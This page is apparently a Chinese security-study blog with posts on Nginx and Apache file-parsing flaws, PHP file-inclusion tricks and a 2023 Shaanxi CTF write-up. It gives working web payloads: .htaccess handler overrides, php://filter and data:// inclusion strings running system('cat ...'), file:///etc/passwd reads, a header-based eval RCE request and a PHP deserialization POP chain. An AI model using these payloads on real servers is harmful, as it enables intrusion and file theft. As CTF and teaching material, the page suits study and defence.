+<p>原因在于，Nginx拿到文件路径（更专业的说法是URI）&#x2F;test.jpg&#x2F;test.php 后，一看后缀是.php，便认为该文件是php文件，于是转交给php去处理。php一看 &#x2F;test.jpg&#x2F;test.php 不存在，便删去最后的&#x2F;test.php，又看&#x2F;test.jpg存在，便把&#x2F;test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回 Access denied. 。</p>
+<p>这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项有什么用呢？看名字就知道是对文件路径进行处理。举个例子，当 php 遇到文件路径 &#x2F;aaa.xxx&#x2F;bbb.yyy&#x2F;ccc.zzz 时，若 &#x2F;aaa.xxx&#x2F;bbb.yyy&#x2F;ccc.zzz 不存在，则会去掉最后的 &#x2F;ccc.zzz ，然后判断 &#x2F;aaa.xxx&#x2F;bbb.yyy 是否存在，若存在，则把 &#x2F;aaa.xxx&#x2F;bbb.yyy 当做文件 &#x2F;aaa.xxx&#x2F;bbb.yyy&#x2F;ccc.zzz ，若  &#x2F;aaa.xxx&#x2F;bbb.yyy 仍不存在，则继续去掉 &#x2F;bbb.yyy ，以此类推。</p>
+<p>该选项在配置文件 php.ini 中。若是关闭该选项，访问 <a target="_blank" rel="noopener" href="http://127.0.0.1/test.jpg/test.php">http://127.0.0.1/test.jpg/test.php</a> 只会返回找不到文件。但关闭该选项很可能会导致一些其他错误，所以一般默认是开启的。</p>
+<p>但是目前我们还没能成功执行代码，test.jpg 没有当成php文件执行，只是返回了 Access denied ，因为新版本的php引入了security.limit_extensions ，限制了可执行文件的后缀，默认只允许执行.php文件。</p>
+<p>这一漏洞是由于Nginx中php配置不当而造成的，与Nginx版本无关，但在高版本的php中，由于security.limit_extensions 的引入，使得该漏洞难以被成功利用。</p>
+<p>为何是Nginx中的php才会有这一问题呢？因为Nginx只要一看URL中路径名以.php结尾，便不管该文件是否存在，直接交给php处理。而如Apache等，会先看该文件是否存在，若存在则再决定该如何处理。cgi.fix_pathinfo是php具有的，若在php前便已正确判断了文件是否存在，cgi.fix_pathinfo便派不上用场了，这一问题自然也就不存在了。（IIS在这一点和Nginx是一样的，同样存在这一问题）</p>
+<h2 id="00空字节代码解析漏洞"><a href="#00空字节代码解析漏洞" class="headerlink" title="%00空字节代码解析漏洞"></a>%00空字节代码解析漏洞</h2><p>原理：Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码</p>
+<p>在以下版本的nginx中，我们在图片中嵌入PHP代码然后通过访问 xxx.jpg%00.php 来执行其中的代码</p>
+<p> Nginx 0.5.*</p>
+<p> Nginx 0.6.*</p>
+<p> Nginx 0.7 &lt;&#x3D; 0.7.65</p>
+<p> Nginx 0.8 &lt;&#x3D; 0.8.37</p>
+<h2 id="CVE-2013-4547-20-00"><a href="#CVE-2013-4547-20-00" class="headerlink" title="CVE-2013-4547(%20%00)"></a>CVE-2013-4547(%20%00)</h2><p>影响nginx版本：nginx 0.8.41 ~ 1.5.6</p>
+<p>这一漏洞的原理是非法字符空格和截止符（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。是什么意思呢？举个例子，假设服务器上存在文件：“file.jpg ”，注意文件名的最后一个字符是空格。则可以通过访问：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/file.jpg">http://127.0.0.1/file.jpg</a> \0.php </p>
+<p>让Nginx认为文件“file.jpg ”的后缀为“.php”。</p>
+<p>来测试下，这次测试在Nginx&#x2F;1.0.15中进行。首先准备一张图片，命名为“test.html ”，注意，文件名含有空格。然后在浏览器中访问该文件，会得到一个404，因为浏览器自动将空格编码为%20，服务器中不存在文件“test.html%20”。</p>
+<p>测试目标是要让Nginx认为该文件是图片文件并正确地在浏览器中显示出来。我们想要的是未经编码的空格和截止符（\0），怎么办呢？使用Burp Suite抓取浏览器发出的请求包，修改为我们想要的样子，原本的URL是：<a target="_blank" rel="noopener" href="http://192.168.56.101/test.htmlAAAjpg">http://192.168.56.101/test.htmlAAAjpg</a> ,将第一个“A”改成“20”（空格符号的ASCII码），将第二个“A”改成“00”（截止符），将第三个“A”改成“2e”（“.”的ASCII码），如图</p>
+<p> <a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/i-beta/1964477/202003/1964477-20200308194656774-1403436835.png"><img src="/2023/07/02/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1964477-20200308194656774-1403436835.png" alt="img"></a></p>
+<p>修改完毕后Forward该请求，在浏览器中看到：</p>
+<p> <a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/i-beta/1964477/202003/1964477-20200308194716298-1059932045.png"><img src="/2023/07/02/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1964477-20200308194716298-1059932045.png" alt="img"></a></p>
+<p>我们已经成功地利用了漏洞！但这有什么用呢？我们想要的是代码被执行。</p>
+<p>继续测试，准备文件“test.jpg ”，注意文件名的最后一个字符是空格，上传到服务器。文件内容为：</p>
+<p> <a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/i-beta/1964477/202003/1964477-20200308194738014-861923558.png"><img src="/2023/07/02/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1964477-20200308194738014-861923558.png" alt="img"></a></p>
+<p>用Burp Suite抓包并修改，原本的URL是：<a target="_blank" rel="noopener" href="http://192.168.56.101/test.jpg%E2%80%A6php">http://192.168.56.101/test.jpg…php</a> ,将jpg后的第一个“.”改为20，第二个“.”改为00，如下图所示：</p>
+<p> <a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/i-beta/1964477/202003/1964477-20200308194746793-602361880.png"><img src="/2023/07/02/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1964477-20200308194746793-602361880.png" alt="img"></a></p>
+<p>修改完毕后 Forword 该请求，在浏览器中看到：Access denied ，好吧，又是这个。</p>
+<p>这说明Nginx在接收到这一请求后，确实把文件“test.jpg ”当做php文件交给php去执行了，只是php看到该文件后缀为“.jpg ”而拒绝执行。这样，便验证了Nginx确实存在该漏洞。但是由于 security.limit_extensions 的存在，导致我们并不能利用此漏洞</p>
+<h1 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h1><h2 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h2><p>apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。比如 xie.php.owf.rar   .owf和.rar 这两种后缀是apache不可识别的解析，apache就会把xie.php.owf.rar解析成 xie.php 。如何判断是不是合法的后缀就是这个漏洞的利用关键，测试时可以尝试上传一个 xie.php.rara.jpg.png..(把你知道的后缀都写上去)去测试是否是合法后缀。任意不识别的后缀，逐级向上识别。</p>
+<h2 id="罕见后缀"><a href="#罕见后缀" class="headerlink" title="罕见后缀"></a>罕见后缀</h2><p>计算机世界自开天辟地以来，便自由多彩。还记得mime.types文件吗？在该文件中搜索“php”这三个字母，结果如下所示：</p>
+<ol>
+<li>werner@Yasser:~$ cat &#x2F;etc&#x2F;mime.types | grep php</li>
+<li><em>#application&#x2F;x-httpd-php     phtml pht php</em></li>
+<li><em>#application&#x2F;x-httpd-php-source      phps</em></li>
+<li><em>#application&#x2F;x-httpd-php3     php3</em></li>
+<li><em>#application&#x2F;x-httpd-php3-preprocessed    php3p</em></li>
+<li><em>#application&#x2F;x-httpd-php4     php4</em></li>
+<li><em>#application&#x2F;x-httpd-php5     php5</em></li>
+</ol>
+<p>还记得正则表达式”.+.ph(p[345]?|t|tml)$”吗，该正则表达式匹配的不仅仅有php，还有php3、php4、php5、pht和phtml。</p>
+<p>好吧，原来不仅php，就连phtml、pht、php3、php4和php5都是Apache和php认可的php程序的文件后缀。我原本只知道“.php”的，真是大开眼界。这就好比，不仅py是Python程序文件的后缀，还有pyc和pyo也都是。写上传过滤规则的程序员是否博学多识，也知道这些知识呢？我想，大抵是不知道的。利用这些“罕见”的后缀名，也可能绕过安全检查，干些“坏事”。</p>
+<p>我在Ubuntu14.04+Apache2.4.7中进行测试，先准备文件text.php，其内容是经典的Hello World：</p>
+ <?php echo 'HELLO WORLD'; ?>
+
+<p>然后在浏览器中打开它，成功显示“HELLO WORLD”。再修改该文件后缀为各种后缀，进行测试。测试结果是，以php、phtml、pht、php3、php4和php5为后缀，能成功看到“HELLO WORLD”；以phps为后缀，会报403错误，Forbidden；以php3p为后缀，会在浏览器中看到源码。</p>
+<h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 .htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 httpd.conf 文件中配置。</p>
+<p> .htaccess 文件生效前提条件为：</p>
+<p>mod_rewrite 模块开启</p>
+<p>AllowOverride All</p>
+<p>#1：这个.htaccess的意思就是把所有名字里面含有shell的文件当成php脚本来执行</p>
+<p>&lt;FilesMatch  “shell”&gt; </p>
+<p>SetHandler application&#x2F;x-httpd-php </p>
+
+
+ 
+
+<p>#2：这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析</p>
+<p>AddType application&#x2F;x-httpd-php .jpg</p>
+<h1 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h1><p>php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a target="_blank" rel="noopener" href="http://php.net/manual/zh/ini.list.php">http://php.net/manual/zh/ini.list.php</a> </p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-文件包含" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/07/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
+  	<time datetime="2023-07-02T02:08:53.000Z" itemprop="datePublished">2023-07-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/07/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+        文件包含
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="1，什么是文件包含？"><a href="#1，什么是文件包含？" class="headerlink" title="1，什么是文件包含？"></a>1，什么是文件包含？</h3><p>“文件包含概述 和SQL注入等攻击方式一样,文件包含漏洞也是一种“注入型漏洞”,</p>
+<p>其本质就是输入一段用户能够控制的脚本或者代码,并让服务器端执行。</p>
+<p>PHP语言功能强大，灵活，</p>
+<p>文件包含的漏洞基本在PHP中</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/418007199">https://zhuanlan.zhihu.com/p/418007199</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php </span><br><span class="line">$ file = $ _GET [&#x27;file&#x27;];</span><br><span class="line">include ($ file);</span><br><span class="line"></span><br><span class="line">&lt;? php phpinfo ();</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2，如何利用文件包含？"><a href="#2，如何利用文件包含？" class="headerlink" title="2，如何利用文件包含？"></a>2，如何利用文件包含？</h3><p>1.造成文件包含漏洞的函数通常有：<br><strong>include、require</strong>、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readline<br>2.data协议<br>用法：<br>data:&#x2F;&#x2F;text&#x2F;plain,xxxx(要执行的php代码)<br>data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)<br>3.php:&#x2F;&#x2F;协议<br>php:&#x2F;&#x2F;input,用于执行php代码，需要post请求提交数据。</p>
+<h3 id="3，例题练习"><a href="#3，例题练习" class="headerlink" title="3，例题练习"></a>3，例题练习</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
+<h3 id="4，运用（伪协议）"><a href="#4，运用（伪协议）" class="headerlink" title="4，运用（伪协议）"></a>4，运用（伪协议）</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51735061/article/details/123156046">https://blog.csdn.net/weixin_51735061/article/details/123156046</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter:/convert.base64-encode/resource=index.php</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=index</span></span><br><span class="line"></span><br><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=</span></span><br><span class="line"></span><br><span class="line">?page=data:<span class="comment">//text/plain,%3C?%20system(%27cat%20fl4gisisish3r3.php%27);?%3E</span></span><br><span class="line"></span><br><span class="line">/?page=data:<span class="comment">//text/plain,&lt;? system(&#x27;cat fl4gisisish3r3.php&#x27;);?&gt;</span></span><br><span class="line">/?file=data:<span class="comment">//test/plain,&lt;?php eval(system(&#x27;ls&#x27;));?&gt;</span></span><br><span class="line"></span><br><span class="line">?page=phP:<span class="comment">//filter/read=convert.base64-encode/resource=fl4gisisish3r3.php</span></span><br><span class="line">?filename=php:<span class="comment">//filter/convert.iconv.a（以下编码）.b（以下编码）/resource=check.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">php支持的编码格式(部分)</span><br><span class="line"></span><br><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line">EUC-JP*</span><br><span class="line">SJIS*</span><br><span class="line">eucJP-win*</span><br><span class="line">SJIS-win*</span><br><span class="line">ISO-2022-JP</span><br><span class="line">ISO-2022-JP-MS</span><br><span class="line">CP932</span><br><span class="line">CP51932</span><br><span class="line">SJIS-mac（别名：MacJapanese）</span><br><span class="line">SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO）</span><br><span class="line">SJIS-Mobile#KDDI（别名：SJIS-KDDI）</span><br><span class="line">SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）</span><br><span class="line">UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO）</span><br><span class="line">UTF-8-Mobile#KDDI-A</span><br><span class="line">UTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI）</span><br><span class="line">UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK）</span><br><span class="line">ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI）</span><br></pre></td></tr></table></figure>
+
+
+
+<p>附：</p>
+<p>靶场   <a target="_blank" rel="noopener" href="http://120.77.19.133:8085/">http://120.77.19.133:8085/</a></p>
+<p>web入门</p>
+<p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/problem-set-index?id=25">https://adworld.xctf.org.cn/challenges/problem-set-index?id=25</a></p>
+<h3 id="5，伪协议绕过file-get-contents、"><a href="#5，伪协议绕过file-get-contents、" class="headerlink" title="5，伪协议绕过file_get_contents、"></a>5，伪协议绕过file_get_contents、</h3><h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><p>作用：</p>
+<blockquote>
+<p>用于访问文件（绝对路径、相对路径、网络路径）</p>
+</blockquote>
+<p>示例：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xx.com?file=file:///etc/passswd</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><p>作用：</p>
+<blockquote>
+<p>访问输入输出流</p>
+</blockquote>
+<p><strong>1. <code>php://filter</code></strong></p>
+<p>作用：</p>
+<blockquote>
+<p>读取源代码并进行base64编码输出</p>
+</blockquote>
+<p>示例：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=[文件名]（针对php文件需要base64编码）</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>参数：</p>
+<blockquote>
+<p>resource&#x3D;&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流<br>read&#x3D;&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br>write&#x3D;&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br>&lt;；两个链的筛选列表&gt; 任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</p>
+</blockquote>
+<p><strong>2. <code>php://input</code></strong></p>
+<p>作用：</p>
+<blockquote>
+<p>执行POST数据中的php代码</p>
+</blockquote>
+<p>示例：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?cmd=php://input</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>POST数据：<code>&lt;?php phpinfo()?&gt;</code></p>
+</blockquote>
+</blockquote>
+<p>注意：</p>
+<blockquote>
+<p><code>enctype=&quot;multipart/form-data&quot;</code> 的时候 <code>php://input</code> 是无效的</p>
+</blockquote>
+<h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><p>作用：</p>
+<blockquote>
+<p>自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到<code>base64编码</code>传输</p>
+</blockquote>
+<p>示例：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+</blockquote>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-2023陕西省赛" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/" class="article-date">
+  	<time datetime="2023-07-02T02:07:09.000Z" itemprop="datePublished">2023-07-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/">
+        2023陕西省赛
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="可燃冰战队-WriteUp"><a href="#可燃冰战队-WriteUp" class="headerlink" title="可燃冰战队 WriteUp"></a>可燃冰战队 WriteUp</h1><h2 id="排名"><a href="#排名" class="headerlink" title="排名"></a>排名</h2><p>可燃冰：第42名</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603161709875.png" alt="image-20230603161709875"></p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="EzRCE"><a href="#EzRCE" class="headerlink" title="EzRCE"></a>EzRCE</h4><p>key传入admin获取源码，分析代码发现&#x2F;hahaha&#x2F;是正则表达式，表示要匹配的字符串为”hahaha”；&#x2F;e是preg_replace函数的模式参数，表示替换字符串时要将替换字符串作为PHP代码执行；qaq是一个变量，表示要替换成的值；name是要进行替换的原始字符串，$name1是替换后的结果。</p>
+<p>经过多次测试发现无参数rce可行，读取出waf.php内容</p>
+<p>然后发现过滤许多函数，并且普通读取flag的时候无法读取，有Linux权限限制，看到禁用的函数和apache环境，于是猜测使用apache_request_headers()</p>
+<p>所以只要post传入：</p>
+<p>name&#x3D;hahaha&amp;qaq&#x3D;eval(array_rand(array_flip(apache_request_headers())))</p>
+<p>请求头添加</p>
+<p>H: system(&amp;apos;cat &#x2F;flag&amp;apos;);</p>
+<p>Get传入</p>
+<p>?key&#x3D;admin</p>
+<p>多传几次或放爆破模块里获得flag,最终payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?key=admin HTTP/1.1</span><br><span class="line">Host: 4744404a.clsadp.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 70</span><br><span class="line">H: system(&#x27;cat /flag&#x27;);</span><br><span class="line"></span><br><span class="line">name=hahaha&amp;qaq=eval(array_rand(array_flip(apache_request_headers())))</span><br></pre></td></tr></table></figure>
+
+<h4 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h4><p>这题上来点,发现点不动,看js代码发现<img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603151503173.png" alt="image-20230603151503173"></p>
+<p>解出来&#x2F;pop3ZTgMw.php,开始分析代码,解题时发现pop链很简单,但无法执行,底部还有一段报错.</p>
+<p>搜了一下发现是php的GC回收机制的原因,无法调用__destruct()方法,解决办法是让属性个数加一.</p>
+<p>所以编写pop链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class night</span><br><span class="line">&#123;</span><br><span class="line">    public $night;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">        $this-&gt;night = new day();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class day</span><br><span class="line">&#123;</span><br><span class="line">    public $day;</span><br><span class="line">&#125;</span><br><span class="line">class light</span><br><span class="line">&#123;</span><br><span class="line">    public $light;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">        $this-&gt;light = new day;</span><br><span class="line">		$this-&gt;light-&gt;day= new dark;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dark</span><br><span class="line">&#123;</span><br><span class="line">    public $dark=&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new night();</span><br><span class="line">$b=new day();</span><br><span class="line">$c=new light();</span><br><span class="line">$d=new dark();</span><br><span class="line">$a-&gt;night=$b;</span><br><span class="line">$b-&gt;day=$d;</span><br><span class="line">$d-&gt;dark=$c;</span><br><span class="line"></span><br><span class="line">echo (((serialize($a))));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最终payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;night&quot;:2:&#123;s:5:&quot;night&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:54:&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有一个坑就是直接post一个pop不对,有不可见字符,在vscode里能看到</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155209421.png" alt="image-20230603155209421"></p>
+<p>要一起post传上去才行</p>
+<h4 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h4><p>这一题在传参时测出来了非预期解,使用passthru能命令执行</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=passthru (&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="可是雪啊飘进双眼"><a href="#可是雪啊飘进双眼" class="headerlink" title="可是雪啊飘进双眼"></a>可是雪啊飘进双眼</h4><p>音频后半段有摩斯密码</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155714227.png" alt="image-20230603155714227"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.-- --- .- .. ... .... .- -. -..- ..</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155802643.png" alt="image-20230603155802643"></p>
+<p>然后用SNOW  </p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155833418.png" alt="image-20230603155833418"></p>
+<p>得到压缩包密码</p>
+<p>压缩包里面key.jpg有隐藏文件</p>
